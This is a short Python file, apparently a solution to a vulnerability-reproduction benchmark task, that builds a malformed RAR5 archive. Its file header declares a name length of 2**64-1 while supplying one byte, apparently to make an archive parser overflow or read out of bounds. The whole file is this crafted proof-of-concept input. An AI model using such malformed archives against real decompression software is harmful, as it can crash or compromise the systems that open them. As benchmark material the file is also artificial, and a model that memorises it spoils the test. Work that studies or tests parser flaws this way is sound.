import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def vint(n: int) -> bytes:
            if n == 0:
                return b'\x00'
            out = b''
            while n > 0:
                byte = n & 0x7f
                n >>= 7
                if n > 0:
                    byte |= 0x80
                out += struct.pack('<B', byte)
            return out

        def make_block(block_type: int, block_flags: int, block_data: bytes) -> bytes:
            payload = vint(block_type) + vint(block_flags) + block_data
            return b"\x00\x00\x00\x00" + vint(len(payload)) + payload
        
        signature = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        main_header_data = vint(0)
        main_header = make_block(block_type=1, block_flags=0, block_data=main_header_data)

        name_len = 2**64 - 1
        file_header_data = b"".join([
            vint(0),
            vint(0),
            vint(0),
            vint(0),
            vint(0),
            vint(name_len),
            b"A"
        ])
        file_header = make_block(block_type=2, block_flags=0, block_data=file_header_data)
        
        end_header_data = vint(0)
        end_header = make_block(block_type=5, block_flags=0, block_data=end_header_data)

        return signature + main_header + file_header + end_header
